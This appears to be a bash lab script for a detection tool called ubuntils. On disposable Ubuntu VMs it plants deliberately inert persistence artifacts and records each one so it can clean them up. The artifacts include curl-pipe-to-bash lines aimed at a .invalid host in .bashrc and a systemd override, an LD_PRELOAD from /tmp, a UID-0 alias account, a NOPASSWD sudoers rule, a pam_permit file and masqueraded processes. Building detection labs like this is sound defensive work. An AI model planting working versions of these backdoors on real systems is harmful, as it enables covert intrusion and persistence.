#!/usr/bin/env bash
# seed-lab.sh — plant inert persistence artifacts that ubuntils detects.
#
# For DISPOSABLE test VMs and live demos only. Every artifact is built to trip
# a detection rule while being unusable:
#   - nothing executes: cron entries are scheduled for 31 February, systemd
#     units are never enabled, processes are renamed copies of `sleep`
#   - nothing grants access: lab accounts are locked, the SSH key's private
#     half is destroyed on creation, the PAM file belongs to a service nothing
#     uses, URLs use the reserved .invalid TLD
#   - everything carries the "ubuntils-lab" marker and is recorded under
#     /var/lib/ubuntils-lab so `clean` restores the host exactly
#
# Usage:
#   sudo tools/lab/seed-lab.sh plant [--with-empty-password]
#   sudo tools/lab/seed-lab.sh status
#   sudo tools/lab/seed-lab.sh clean
set -euo pipefail

MARK="ubuntils-lab"
STATE=/var/lib/ubuntils-lab
LAB_USER=ubuntils-lab
LAB_ROOT_USER=ubuntils-lab-root
LAB_NOPW_USER=ubuntils-lab-nopw
NEVER="0 0 31 2 *"   # 31 February: a valid cron schedule that never fires
TAMPER_FILE=/usr/share/base-files/dot.bashrc

say()  { printf '  %-28s %s\n' "$1" "$2"; }
warn() { printf 'warning: %s\n' "$*" >&2; }
die()  { printf 'error: %s\n' "$*" >&2; exit 1; }

require_root() { [[ $EUID -eq 0 ]] || die "run as root (sudo $0 $*)"; }

require_ubuntu() {
    # shellcheck disable=SC1091
    . /etc/os-release 2>/dev/null || die "cannot read /etc/os-release"
    [[ ${ID:-} == ubuntu ]] || die "this lab targets Ubuntu (found ${ID:-unknown})"
}

confirm() {
    [[ ${UBUNTILS_LAB_YES:-} == 1 ]] && return
    cat <<EOF
This plants inert attacker-style artifacts on $(hostname) for ubuntils to find:
cron entries, systemd units, a locked UID-0 account, an SSH key with no
private half, a PAM file, two renamed 'sleep' processes, a setuid 'true',
an append-only flag on /var/log/btmp, a one-line edit to a package file,
and the 'dummy' kernel module. Run '$0 clean' to remove all of it.

Only do this on a disposable VM you control.
EOF
    local reply=""
    read -r -p "Plant the lab on $(hostname)? [y/N] " reply || true
    [[ $reply == [yY] ]] || die "aborted (set UBUNTILS_LAB_YES=1 to skip this prompt)"
}

record() { printf '%s\n' "$*" >> "$STATE/actions"; }

# ─── plant ────────────────────────────────────────────────────────────────────

plant_users() {
    # A login-shell user with a locked password and no keys of its own — the
    # owner of the per-user artifacts below. Nobody can log in as it.
    # Each account is recorded as soon as it exists, so a failure on the next
    # line still leaves it for `clean`.
    useradd --create-home --shell /bin/bash --comment "$MARK" "$LAB_USER"
    record "user $LAB_USER"
    passwd --lock "$LAB_USER" >/dev/null
    say USER_UID_ZERO "creating locked, nologin UID-0 alias $LAB_ROOT_USER"
    useradd --non-unique --uid 0 --gid 0 --no-create-home --home-dir /nonexistent \
        --shell /usr/sbin/nologin --comment "$MARK" "$LAB_ROOT_USER"
    record "user $LAB_ROOT_USER"
    passwd --lock "$LAB_ROOT_USER" >/dev/null
}

plant_empty_password() {
    say USER_EMPTY_PASSWORD "$LAB_NOPW_USER — NO PASSWORD, local console login works"
    useradd --create-home --shell /bin/bash --comment "$MARK" "$LAB_NOPW_USER"
    record "user $LAB_NOPW_USER"
    passwd --delete "$LAB_NOPW_USER" >/dev/null
}

plant_cron() {
    say CRON_TMP_PATH "/etc/cron.d/$MARK (never fires)"
    printf '# %s\n%s root /tmp/%s-beacon.sh\n' "$MARK" "$NEVER" "$MARK" > "/etc/cron.d/$MARK"
    chmod 644 "/etc/cron.d/$MARK"
    record "file /etc/cron.d/$MARK"

    say CRON_ROOT_EXEC "crontab for $LAB_USER using sudo (never fires)"
    printf '# %s\n%s sudo /usr/bin/true\n' "$MARK" "$NEVER" | crontab -u "$LAB_USER" -
    record "crontab $LAB_USER"
}

plant_sudoers() {
    say SUDOERS_NOPASSWD "/etc/sudoers.d/$MARK for $LAB_USER"
    local tmp
    tmp=$(mktemp)
    printf '# %s\n%s ALL=(ALL) NOPASSWD: /usr/bin/true\n' "$MARK" "$LAB_USER" > "$tmp"
    visudo -cf "$tmp" >/dev/null || { rm -f "$tmp"; die "visudo rejected the lab rule"; }
    install -m 0440 -o root -g root "$tmp" "/etc/sudoers.d/$MARK"
    rm -f "$tmp"
    record "file /etc/sudoers.d/$MARK"
}

plant_ssh() {
    command -v ssh-keygen >/dev/null || { warn "ssh-keygen missing — skipping SSH artifacts"; return; }
    local home keydir pub
    home=$(getent passwd "$LAB_USER" | cut -d: -f6)
    keydir=$(mktemp -d)
    # Generate a real key and destroy the private half: the public key parses
    # like any other, and nobody can ever authenticate with it.
    ssh-keygen -q -t ed25519 -N "" -C "$MARK" -f "$keydir/key"
    pub=$(cat "$keydir/key.pub")
    shred -u "$keydir/key" 2>/dev/null || rm -f "$keydir/key"
    rm -rf "$keydir"

    install -d -m 700 -o "$LAB_USER" -g "$LAB_USER" "$home/.ssh"  # removed with the home dir
    say SSH_UNAUTHORIZED_KEY "key with command= option in authorized_keys"
    printf 'command="/tmp/%s-shell",no-pty %s\n' "$MARK" "$pub" > "$home/.ssh/authorized_keys"
    say SSH_UNAUTHORIZED_KEY "key hidden in authorized_keys2"
    printf '%s\n' "$pub" > "$home/.ssh/authorized_keys2"
    chown "$LAB_USER:$LAB_USER" "$home/.ssh/authorized_keys" "$home/.ssh/authorized_keys2"
    chmod 600 "$home/.ssh/authorized_keys" "$home/.ssh/authorized_keys2"
    # (removed with the user's home directory)
}

plant_shell_rc() {
    local home
    home=$(getent passwd "$LAB_USER" | cut -d: -f6)
    say SHELL_RC_MODIFICATION "download-and-execute line in $LAB_USER's .bashrc"
    say LD_PRELOAD_INJECT "LD_PRELOAD from /tmp in $LAB_USER's .bashrc"
    cat >> "$home/.bashrc" <<EOF
# $MARK
curl -s http://$MARK.invalid/update | bash
export LD_PRELOAD=/tmp/$MARK-hook.so
EOF
    # (removed with the user's home directory)
}

plant_systemd() {
    local dir=/etc/systemd/system
    say SUSPICIOUS_SYSTEMD_TIMER "$MARK-updater.service runs from /tmp (not enabled)"
    cat > "$dir/$MARK-updater.service" <<EOF
# $MARK — never enabled or started
[Unit]
Description=$MARK updater

[Service]
ExecStart=/tmp/$MARK-updater
EOF
    record "file $dir/$MARK-updater.service"

    say SUSPICIOUS_SYSTEMD_TIMER "drop-in override piping curl into bash (not enabled)"
    cat > "$dir/$MARK-web.service" <<EOF
# $MARK — never enabled or started
[Unit]
Description=$MARK web

[Service]
ExecStart=/usr/bin/true
EOF
    install -d "$dir/$MARK-web.service.d"
    cat > "$dir/$MARK-web.service.d/override.conf" <<EOF
# $MARK
[Service]
ExecStart=
ExecStart=/usr/bin/bash -c 'curl -s http://$MARK.invalid/s | bash'
EOF
    record "file $dir/$MARK-web.service"
    record "dir $dir/$MARK-web.service.d"
}

plant_pam() {
    # A PAM service nothing uses: pam_permit here can't open any real login.
    say PAM_BACKDOOR "/etc/pam.d/$MARK with 'auth sufficient pam_permit.so'"
    printf '# %s — no program uses this service\nauth sufficient pam_permit.so\n' "$MARK" \
        > "/etc/pam.d/$MARK"
    record "file /etc/pam.d/$MARK"
}

start_decoy() {
    # $1 = path of the renamed sleep binary. setsid detaches it from this shell.
    # The file is recorded before the pid: clean undoes in reverse, so the
    # process is stopped while /proc/<pid>/exe still names the file.
    install -m 755 "$(type -P sleep)" "$1"
    record "file $1"
    setsid "$1" 86400 </dev/null >/dev/null 2>&1 &
    record "pid $! $1"
}

plant_processes() {
    say PROCESS_MASQUERADE "'kworker' running from /dev/shm (fake kernel thread)"
    start_decoy /dev/shm/kworker
    say PROCESS_MASQUERADE "'sshd' running from /var/tmp"
    start_decoy /var/tmp/sshd
}

plant_setuid() {
    say SETUID_INVENTORY "setuid copy of 'true' in /opt/$MARK"
    install -d "/opt/$MARK"
    record "dir /opt/$MARK"
    # type -P, not command -v: `true` is a bash builtin, so command -v
    # returns the bare word "true" instead of /usr/bin/true.
    install -m 4755 -o root -g root "$(type -P true)" "/opt/$MARK/true"
}

plant_immutable() {
    if [[ ! -e /var/log/btmp ]] || ! command -v chattr >/dev/null; then
        warn "no /var/log/btmp or chattr — skipping IMMUTABLE_FLAG_SET"; return
    fi
    if lsattr -d /var/log/btmp 2>/dev/null | cut -d' ' -f1 | grep -q a; then
        warn "/var/log/btmp is already append-only — leaving it alone"; return
    fi
    say IMMUTABLE_FLAG_SET "append-only flag on /var/log/btmp"
    chattr +a /var/log/btmp
    record "chattr /var/log/btmp"
}

plant_package_tamper() {
    if [[ ! -f $TAMPER_FILE ]] || ! dpkg -S "$TAMPER_FILE" >/dev/null 2>&1; then
        warn "$TAMPER_FILE not found or not package-owned — skipping PACKAGE_TAMPERED"; return
    fi
    say PACKAGE_TAMPERED "one comment line appended to $TAMPER_FILE"
    cp -p "$TAMPER_FILE" "$STATE/dot.bashrc.orig"
    printf '# %s\n' "$MARK" >> "$TAMPER_FILE"
    record "restore $TAMPER_FILE $STATE/dot.bashrc.orig"
}

plant_module() {
    if grep -q '^dummy ' /proc/modules; then
        warn "'dummy' module already loaded — leaving it alone"; return
    fi
    if modprobe dummy 2>/dev/null; then
        say KERNEL_MODULE_SUSPICIOUS "loaded the harmless 'dummy' network module"
        record "module dummy"
    else
        warn "could not load 'dummy' — skipping KERNEL_MODULE_SUSPICIOUS"
    fi
}

cmd_plant() {
    local with_empty_password=0
    for arg in "$@"; do
        case $arg in
            --with-empty-password) with_empty_password=1 ;;
            *) die "unknown option: $arg" ;;
        esac
    done
    require_root plant; require_ubuntu
    [[ -e $STATE ]] && die "a lab is already planted — run '$0 clean' first"
    confirm
    install -d -m 700 "$STATE"
    : > "$STATE/actions"
    echo "Planting (rule it should trip → artifact):"
    plant_users
    (( with_empty_password )) && plant_empty_password
    plant_cron
    plant_sudoers
    plant_ssh
    plant_shell_rc
    plant_systemd
    plant_pam
    plant_processes
    plant_setuid
    plant_immutable
    plant_package_tamper
    plant_module
    cat <<EOF

Done. Not planted on purpose:
  PROCESS_SUSPICIOUS_CONNECTION  needs a real outbound connection
$( (( with_empty_password )) || echo "  USER_EMPTY_PASSWORD            opt in with --with-empty-password")

Scan:   ubuntils scan            (or: ubuntils scan --json --output lab.json)
Undo:   sudo $0 clean
EOF
}

# ─── clean ────────────────────────────────────────────────────────────────────

CLEAN_FAILED=0

# step LABEL DETAIL COMMAND...: run one undo step, report it, keep going.
step() {
    local label=$1 detail=$2
    shift 2
    if "$@"; then
        say "$label" "$detail"
    else
        warn "failed: $label $detail"
        CLEAN_FAILED=1
    fi
}

remove_user() {
    # --force for the UID-0 alias: it shares UID 0 with every root process,
    # so plain userdel refuses. It removes only this account's entries.
    if [[ $1 == "$LAB_ROOT_USER" ]]; then
        userdel --force "$1" 2>/dev/null || true
    else
        userdel --remove "$1" 2>/dev/null || true
    fi
    ! getent passwd "$1" >/dev/null
}

stop_decoy() {
    # Only kill the PID if it is still our decoy, not a reused PID.
    [[ $(readlink "/proc/$1/exe" 2>/dev/null) == "$2" ]] || return 0
    kill "$1"
}

cmd_clean() {
    require_root clean
    [[ -f $STATE/actions ]] || die "no lab recorded in $STATE — nothing to clean"
    echo "Removing the lab:"
    local kind a b
    # Undo in reverse order, and keep going past a step that fails (say the
    # responder already removed that crontab from the TUI) — a half-cleaned
    # lab is worse than a warning.
    while read -r kind a b; do
        case $kind in
            pid)     step "stopped" "$b (pid $a)" stop_decoy "$a" "$b" ;;
            file)    step "removed" "$a" rm -f -- "$a" ;;
            dir)     step "removed" "$a" rm -rf -- "$a" ;;
            crontab) crontab -r -u "$a" 2>/dev/null || true; say "removed" "crontab for $a" ;;
            chattr)  step "cleared" "append-only flag on $a" chattr -a "$a" ;;
            restore) step "restored" "$a" cp -p -- "$b" "$a" ;;
            module)  step "unloaded" "module $a" modprobe -r "$a" ;;
            user)    step "deleted" "user $a" remove_user "$a" ;;
        esac
    done < <(tac "$STATE/actions")
    if (( CLEAN_FAILED )); then
        warn "some steps failed — $STATE/actions is kept so you can finish by hand"
        exit 1
    fi
    rm -rf -- "$STATE"
    echo "Lab removed."
}

cmd_status() {
    if [[ -f $STATE/actions ]]; then
        echo "Lab planted ($(wc -l < "$STATE/actions") recorded actions in $STATE/actions)."
    else
        echo "No lab planted."
    fi
}

case ${1:-} in
    plant)  shift; cmd_plant "$@" ;;
    clean)  cmd_clean ;;
    status) cmd_status ;;
    *) sed -n '2,17p' "$0" | sed 's/^# \{0,1\}//'; exit 2 ;;
esac
